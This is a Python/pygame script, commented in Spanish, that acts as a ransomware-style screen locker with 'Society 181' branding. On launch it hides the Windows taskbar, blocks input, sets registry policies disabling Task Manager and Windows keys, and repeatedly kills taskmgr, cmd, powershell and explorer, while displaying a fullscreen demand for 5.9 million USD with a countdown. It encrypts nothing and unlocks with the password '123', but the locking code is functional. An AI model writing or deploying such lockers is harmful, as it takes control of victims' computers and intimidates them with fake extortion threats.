import pygame
import sys
import os
import time
import subprocess
import threading
import ctypes
from datetime import datetime, timedelta

# Constantes de Windows
WM_SYSCOMMAND = 0x0112

def bloquear_windows_completamente():
    """Bloquea Windows completamente"""
    if sys.platform == "win32":
        try:
            # Ocultar barra de tareas
            ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 0)
            
            # Ocultar botón inicio
            ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Button", None), 0)
            
            # Bloquear entrada
            ctypes.windll.user32.BlockInput(True)
            
            # Deshabilitar Task Manager
            subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 
                          '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'], 
                         capture_output=True, shell=True)
            
            # Deshabilitar teclas Windows
            subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
                          '/v', 'NoWinKeys', '/t', 'REG_DWORD', '/d', '1', '/f'], 
                         capture_output=True, shell=True)
            
        except Exception:
            pass

def desbloquear_windows():
    """Desbloquea Windows completamente"""
    if sys.platform == "win32":
        try:
            # Mostrar barra de tareas
            ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 1)
            
            # Mostrar botón inicio
            ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Button", None), 1)
            
            # Habilitar entrada
            ctypes.windll.user32.BlockInput(False)
            
            # Habilitar Task Manager
            subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
                          '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'], 
                         capture_output=True, shell=True)
            
            # Habilitar teclas Windows
            subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
                          '/v', 'NoWinKeys', '/t', 'REG_DWORD', '/d', '0', '/f'], 
                         capture_output=True, shell=True)
            
            # Reiniciar Explorer para asegurar que todo vuelva a la normalidad
            subprocess.run(['taskkill', '/f', '/im', 'explorer.exe'], capture_output=True, shell=True)
            time.sleep(1)
            subprocess.Popen('explorer.exe', shell=True)
            
        except Exception:
            pass

def cerrar_aplicaciones():
    """Cierra aplicaciones que podrían usarse para escapar"""
    try:
        procesos = ['taskmgr.exe', 'cmd.exe', 'powershell.exe', 'explorer.exe']
        for proceso in procesos:
            subprocess.run(f'taskkill /f /im {proceso} >nul 2>&1', shell=True)
    except:
        pass

def mantener_bloqueo_permanente():
    """Mantiene el bloqueo activo permanentemente"""
    while True:
        bloquear_windows_completamente()
        cerrar_aplicaciones()
        time.sleep(1)

def mostrar_mensaje_bloqueo():
    """Muestra mensaje de bloqueo"""
    try:
        subprocess.Popen(['powershell', '-windowstyle', 'hidden', '-command',
                        'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("ACCESO DENEGADO\nEl sistema está completamente bloqueado.\nPresione ESC para ingresar la contraseña de desbloqueo.", "SISTEMA BLOQUEADO", "OK", "Error")'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def restaurar_normalidad_completa():
    """Restaura completamente el sistema a la normalidad"""
    print("Restaurando sistema a la normalidad...")
    
    # Desbloquear Windows
    desbloquear_windows()
    
    # Restaurar configuración de pygame
    pygame.event.set_grab(False)
    pygame.mouse.set_visible(True)
    
    # Cerrar todas las ventanas de pygame
    pygame.quit()
    
    # Mensaje de confirmación
    try:
        subprocess.Popen(['powershell', '-windowstyle', 'hidden', '-command',
                        'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Sistema desbloqueado exitosamente. Todo ha vuelto a la normalidad.", "SISTEMA DESBLOQUEADO", "OK", "Information")'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    
    # Salir completamente
    sys.exit(0)

def mostrar_ransomware():
    # BLOQUEAR INMEDIATAMENTE AL INICIAR
    bloquear_windows_completamente()
    
    # Iniciar hilo de bloqueo permanente
    bloqueo_thread = threading.Thread(target=mantener_bloqueo_permanente, daemon=True)
    bloqueo_thread.start()
    
    # Inicializar pygame
    pygame.init()
    
    # Obtener información de pantalla
    info = pygame.display.Info()
    ancho_pantalla = info.current_w
    alto_pantalla = info.current_h
    
    # Crear ventana en modo pantalla completa SIN BORDES
    pantalla = pygame.display.set_mode((ancho_pantalla, alto_pantalla), pygame.FULLSCREEN | pygame.NOFRAME)
    pygame.display.set_caption("Sistema Bloqueado")
    
    # PERMITIR MOVIMIENTO DEL MOUSE (sin grab)
    pygame.event.set_grab(False)
    pygame.mouse.set_visible(True)
    
    # Colores
    AZUL_FONDO = (0, 177, 255)  # #00b1ff
    BLANCO = (255, 255, 255)
    ROJO = (255, 0, 0)
    NEGRO = (0, 0, 0)
    AZUL_BOTONES = (0, 100, 200)
    ROJO_OSCURO = (200, 0, 0)
    VERDE = (0, 200, 0)
    
    # Fuentes
    try:
        fuente_grande = pygame.font.SysFont("arial", 64, bold=True)
        fuente_titulo = pygame.font.SysFont("arial", 48, bold=True)
        fuente_subtitulo = pygame.font.SysFont("arial", 24, bold=True)
        fuente_texto = pygame.font.SysFont("arial", 20)
        fuente_botones = pygame.font.SysFont("arial", 16, bold=True)
        fuente_tiempo = pygame.font.SysFont("consolas", 32, bold=True)
        fuente_info = pygame.font.SysFont("arial", 18)
        fuente_password = pygame.font.SysFont("arial", 28, bold=True)
        fuente_advertencia = pygame.font.SysFont("arial", 14)
    except:
        fuente_grande = pygame.font.Font(None, 64)
        fuente_titulo = pygame.font.Font(None, 48)
        fuente_subtitulo = pygame.font.Font(None, 24)
        fuente_texto = pygame.font.Font(None, 20)
        fuente_botones = pygame.font.Font(None, 16)
        fuente_tiempo = pygame.font.Font(None, 32)
        fuente_info = pygame.font.Font(None, 18)
        fuente_password = pygame.font.Font(None, 28)
        fuente_advertencia = pygame.font.Font(None, 14)
    
    # Cargar imagen del jester
    imagen_jester = None
    try:
        if os.path.exists("jester.png"):
            imagen_original = pygame.image.load("jester.png")
            max_size = 300
            ancho, alto = imagen_original.get_size()
            escala = max_size / max(ancho, alto)
            nuevo_ancho = int(ancho * escala)
            nuevo_alto = int(alto * escala)
            imagen_jester = pygame.transform.scale(imagen_original, (nuevo_ancho, nuevo_alto))
    except:
        imagen_jester = pygame.Surface((280, 280))
        imagen_jester.fill((30, 30, 30))
        texto_placeholder = fuente_titulo.render("JESTER", True, ROJO)
        imagen_jester.blit(texto_placeholder, (140 - texto_placeholder.get_width()//2, 140 - texto_placeholder.get_height()//2))
    
    # Variables
    password_correcta = "123"
    input_password = ""
    mostrando_password = False
    mensaje_error = ""
    mostrar_acceso_denegado = False
    tiempo_acceso_denegado = 0
    teclas_bloqueadas = 0
    
    # Tiempo 75 HORAS
    tiempo_inicial = timedelta(hours=75, minutes=0, seconds=0)
    tiempo_extra = timedelta(0)
    tiempo_inicio = datetime.now()
    
    # Bucle principal - BLOQUEO CON CUALQUIER TECLA
    ejecutando = True
    while ejecutando:
        current_time = time.time()
        
        for evento in pygame.event.get():
            if evento.type == pygame.QUIT:
                continue  # Ignorar cierre
                
            elif evento.type == pygame.KEYDOWN:
                # CUALQUIER TECLA QUE NO SEA ESC O NÚMEROS MUESTRA ACCESO DENEGADO
                if not mostrando_password:
                    if evento.key != pygame.K_ESCAPE:
                        mostrar_acceso_denegado = True
                        tiempo_acceso_denegado = current_time
                        teclas_bloqueadas += 1
                        mostrar_mensaje_bloqueo()
                        continue
                    else:
                        # Solo ESC muestra contraseña
                        mostrando_password = True
                        input_password = ""
                        mensaje_error = ""
                        mostrar_acceso_denegado = False
                
                # Manejar contraseña
                elif mostrando_password:
                    if evento.key == pygame.K_RETURN:
                        if input_password == password_correcta:
                            # RESTAURAR NORMALIDAD COMPLETA
                            restaurar_normalidad_completa()
                            return  # Salir de la función completamente
                        else:
                            mensaje_error = "CONTRASEÑA INCORRECTA - SISTEMA BLOQUEADO"
                            input_password = ""
                            mostrar_acceso_denegado = True
                            tiempo_acceso_denegado = current_time
                    elif evento.key == pygame.K_ESCAPE:
                        # Cancelar entrada de contraseña
                        mostrando_password = False
                        input_password = ""
                        mensaje_error = ""
                    elif evento.key == pygame.K_BACKSPACE:
                        input_password = input_password[:-1]
                    else:
                        # Solo aceptar números para contraseña
                        if evento.unicode.isdigit() and len(input_password) < 10:
                            input_password += evento.unicode
                        else:
                            # Cualquier otra tecla muestra acceso denegado
                            mostrar_acceso_denegado = True
                            tiempo_acceso_denegado = current_time
                            teclas_bloqueadas += 1
            
            elif evento.type == pygame.MOUSEBUTTONDOWN and not mostrando_password:
                # Detectar clics en botones
                x, y = pygame.mouse.get_pos()
                
                # Botones superiores
                boton_y = 320
                boton_ancho = 140
                boton_alto = 38
                margen = 12
                
                total_ancho = 2 * boton_ancho + margen
                boton_x_inicio = ancho_pantalla // 2 - total_ancho // 2
                
                for i in range(2):
                    rect_boton = pygame.Rect(boton_x_inicio + i*(boton_ancho + margen), boton_y, boton_ancho, boton_alto)
                    if rect_boton.collidepoint(x, y):
                        if i == 0:  # Botón Refresh
                            # REINICIAR EL CONTADOR
                            tiempo_inicio = datetime.now()
                            tiempo_extra = timedelta(0)
                
                # Botones inferiores
                botones_inferiores = ["Refresh", "Payment", "FAQ", "Fvck", "Support"]
                boton_ancho_inf = 140
                boton_alto_inf = 35
                margen_inf = 10
                
                total_ancho_inf = 5 * boton_ancho_inf + 4 * margen_inf
                boton_x_inf = ancho_pantalla // 2 - total_ancho_inf // 2
                boton_y_inf = 650  # Aproximada posición
                
                for i in range(5):
                    rect_boton = pygame.Rect(boton_x_inf + i*(boton_ancho_inf + margen_inf), boton_y_inf, boton_ancho_inf, boton_alto_inf)
                    if rect_boton.collidepoint(x, y) and i == 0:  # Botón Refresh inferior
                        # REINICIAR EL CONTADOR
                        tiempo_inicio = datetime.now()
                        tiempo_extra = timedelta(0)
        
        # Calcular tiempo
        tiempo_transcurrido = datetime.now() - tiempo_inicio
        tiempo_restante = tiempo_inicial + tiempo_extra - tiempo_transcurrido
        if tiempo_restante.total_seconds() <= 0:
            tiempo_restante = timedelta(0)
        
        # Formatear tiempo
        total_segundos = int(tiempo_restante.total_seconds())
        dias = total_segundos // 86400
        horas = (total_segundos % 86400) // 3600
        minutos = (total_segundos % 3600) // 60
        segundos = total_segundos % 60
        
        if dias > 0:
            tiempo_texto = f"{dias}d {horas:02d}h {minutos:02d}m {segundos:02d}s"
        else:
            tiempo_texto = f"{horas:02d}h {minutos:02d}m {segundos:02d}s"
        
        # DIBUJAR INTERFAZ
        pantalla.fill(AZUL_FONDO)
        
        # Título
        titulo = fuente_titulo.render("#SOCIETY 181.", True, ROJO)
        pantalla.blit(titulo, (ancho_pantalla//2 - titulo.get_width()//2, 30))
        
        # Mensaje
        lineas_advertencia = [
            "Your files are encrypted.",
            "To get the key to decrypt files, you have to pay 5.9 million USD.",
            "If payment is not made by tomorrow night we'll brick your entire system.",
            "More instructions forthcoming - Society:"
        ]
        
        y_pos = 100
        for linea in lineas_advertencia:
            if linea == lineas_advertencia[0]:
                texto = fuente_subtitulo.render(linea, True, BLANCO)
            else:
                texto = fuente_texto.render(linea, True, BLANCO)
            pantalla.blit(texto, (ancho_pantalla//2 - texto.get_width()//2, y_pos))
            y_pos += 35 if linea == lineas_advertencia[0] else 30
        
        # Tiempo
        tiempo_surface = fuente_tiempo.render(f"Time left: {tiempo_texto}", True, ROJO)
        pantalla.blit(tiempo_surface, (ancho_pantalla//2 - tiempo_surface.get_width()//2, 230))
        
        # Cuadro información
        cuadro_ancho = 450
        cuadro_alto = 90
        cuadro_x = ancho_pantalla // 2 - cuadro_ancho // 2
        cuadro_y = 280
        
        pygame.draw.rect(pantalla, BLANCO, (cuadro_x, cuadro_y, cuadro_ancho, cuadro_alto))
        pygame.draw.rect(pantalla, NEGRO, (cuadro_x, cuadro_y, cuadro_ancho, cuadro_alto), 2)
        
        info_lineas = [
            "Your system: (864)",
            "First connect IP: 192.168.68.100", 
            "Total encrypted: 8,326 encrypted files"
        ]
        
        info_y = cuadro_y + 15
        for linea in info_lineas:
            texto_info = fuente_info.render(linea, True, NEGRO)
            texto_x = cuadro_x + (cuadro_ancho - texto_info.get_width()) // 2
            pantalla.blit(texto_info, (texto_x, info_y))
            info_y += 28
        
        # Botones arriba
        botones_arriba = ["Refresh", "Payment"]
        boton_ancho = 140
        boton_alto = 38
        margen = 12
        
        total_ancho = 2 * boton_ancho + margen
        boton_x = ancho_pantalla // 2 - total_ancho // 2
        boton_y = cuadro_y + cuadro_alto + 25
        
        for i, texto in enumerate(botones_arriba):
            rect_boton = pygame.Rect(boton_x, boton_y, boton_ancho, boton_alto)
            
            pygame.draw.rect(pantalla, BLANCO, rect_boton)
            pygame.draw.rect(pantalla, NEGRO, rect_boton, 2)
            
            texto_boton = fuente_botones.render(texto, True, NEGRO)
            texto_x = boton_x + (boton_ancho - texto_boton.get_width()) // 2
            texto_y = boton_y + (boton_alto - texto_boton.get_height()) // 2
            pantalla.blit(texto_boton, (texto_x, texto_y))
            
            boton_x += boton_ancho + margen
        
        # Imagen
        if imagen_jester:
            imagen_x = ancho_pantalla // 2 - imagen_jester.get_width() // 2
            imagen_y = boton_y + boton_alto + 30
            pantalla.blit(imagen_jester, (imagen_x, imagen_y))
        
        # Botones inferiores
        botones_inferiores = ["Refresh", "Payment", "FAQ", "Fvck", "Support"]
        boton_ancho_inf = 140
        boton_alto_inf = 35
        margen_inf = 10
        
        total_ancho_inf = 5 * boton_ancho_inf + 4 * margen_inf
        boton_x_inf = ancho_pantalla // 2 - total_ancho_inf // 2
        boton_y_inf = imagen_y + imagen_jester.get_height() + 40
        
        for i, texto in enumerate(botones_inferiores):
            rect_boton = pygame.Rect(boton_x_inf, boton_y_inf, boton_ancho_inf, boton_alto_inf)
            
            pygame.draw.rect(pantalla, AZUL_BOTONES, rect_boton)
            pygame.draw.rect(pantalla, BLANCO, rect_boton, 1)
            
            texto_boton = fuente_botones.render(texto, True, BLANCO)
            texto_x = boton_x_inf + (boton_ancho_inf - texto_boton.get_width()) // 2
            texto_y = boton_y_inf + (boton_alto_inf - texto_boton.get_height()) // 2
            pantalla.blit(texto_boton, (texto_x, texto_y))
            
            boton_x_inf += boton_ancho_inf + margen_inf
        
        # Línea y texto final
        linea_y = boton_y_inf + boton_alto_inf + 25
        pygame.draw.line(pantalla, BLANCO, (ancho_pantalla//2 - 300, linea_y), (ancho_pantalla//2 + 300, linea_y), 2)
        
        texto_final1 = fuente_subtitulo.render("SOCIETY 181 O ACTUAL™", True, ROJO)
        texto_final2 = fuente_texto.render("There's an unequal amount of good and bad in most things.", True, BLANCO)
        texto_final3 = fuente_texto.render("The trick is to figure out the ratio and act accordingly.", True, BLANCO)
        
        pantalla.blit(texto_final1, (ancho_pantalla//2 - texto_final1.get_width()//2, linea_y + 20))
        pantalla.blit(texto_final2, (ancho_pantalla//2 - texto_final2.get_width()//2, linea_y + 60))
        pantalla.blit(texto_final3, (ancho_pantalla//2 - texto_final3.get_width()//2, linea_y + 95))
        
        # Contador de teclas bloqueadas
        texto_contador = fuente_advertencia.render(f"Intentos de escape bloqueados: {teclas_bloqueadas}", True, ROJO_OSCURO)
        pantalla.blit(texto_contador, (20, alto_pantalla - 30))
        
        # Instrucciones
        texto_instrucciones = fuente_advertencia.render("Presione ESC para ingresar contraseña de desbloqueo", True, VERDE)
        pantalla.blit(texto_instrucciones, (ancho_pantalla//2 - texto_instrucciones.get_width()//2, alto_pantalla - 30))
        
        # Mensaje de ACCESO DENEGADO
        if mostrar_acceso_denegado and current_time - tiempo_acceso_denegado < 3:
            overlay = pygame.Surface((ancho_pantalla, alto_pantalla), pygame.SRCALPHA)
            overlay.fill((255, 0, 0, 120))
            pantalla.blit(overlay, (0, 0))
            
            texto_denegado = fuente_grande.render("ACCESO DENEGADO", True, BLANCO)
            pantalla.blit(texto_denegado, (ancho_pantalla//2 - texto_denegado.get_width()//2, alto_pantalla//2 - 80))
            
            texto_mensaje = fuente_subtitulo.render("El sistema está completamente bloqueado", True, BLANCO)
            pantalla.blit(texto_mensaje, (ancho_pantalla//2 - texto_mensaje.get_width()//2, alto_pantalla//2))
            
            texto_escape = fuente_texto.render("Presione ESC para ingresar la contraseña de desbloqueo", True, BLANCO)
            pantalla.blit(texto_escape, (ancho_pantalla//2 - texto_escape.get_width()//2, alto_pantalla//2 + 50))
        
        # Diálogo contraseña
        if mostrando_password:
            overlay = pygame.Surface((ancho_pantalla, alto_pantalla), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 200))
            pantalla.blit(overlay, (0, 0))
            
            pass_ancho = 500
            pass_alto = 240
            pass_x = ancho_pantalla // 2 - pass_ancho // 2
            pass_y = alto_pantalla // 2 - pass_alto // 2
            
            pygame.draw.rect(pantalla, BLANCO, (pass_x, pass_y, pass_ancho, pass_alto))
            pygame.draw.rect(pantalla, NEGRO, (pass_x, pass_y, pass_ancho, pass_alto), 3)
            
            texto_pass = fuente_password.render("INGRESE CONTRASEÑA PARA DESBLOQUEAR EL SISTEMA:", True, NEGRO)
            pantalla.blit(texto_pass, (ancho_pantalla//2 - texto_pass.get_width()//2, pass_y + 30))
            
            input_rect = pygame.Rect(ancho_pantalla//2 - 200, pass_y + 90, 400, 50)
            pygame.draw.rect(pantalla, (240, 240, 240), input_rect)
            pygame.draw.rect(pantalla, NEGRO, input_rect, 2)
            
            pass_display = "*" * len(input_password)
            texto_input = fuente_password.render(pass_display, True, NEGRO)
            texto_input_x = input_rect.x + (input_rect.width - texto_input.get_width()) // 2
            texto_input_y = input_rect.y + (input_rect.height - texto_input.get_height()) // 2
            pantalla.blit(texto_input, (texto_input_x, texto_input_y))
            
            if mensaje_error:
                texto_error = fuente_texto.render(mensaje_error, True, ROJO_OSCURO)
                pantalla.blit(texto_error, (ancho_pantalla//2 - texto_error.get_width()//2, pass_y + 160))
            
            texto_instruc = fuente_texto.render("ENTER: Confirmar | ESC: Cancelar | Solo números permitidos", True, NEGRO)
            pantalla.blit(texto_instruc, (ancho_pantalla//2 - texto_instruc.get_width()//2, pass_y + 190))
        
        pygame.display.flip()
        pygame.time.Clock().tick(30)
    
    pygame.quit()
    sys.exit()

if __name__ == "__main__":
    # EJECUCIÓN INMEDIATA - BLOQUEO CON CUALQUIER TECLA
    mostrar_ransomware()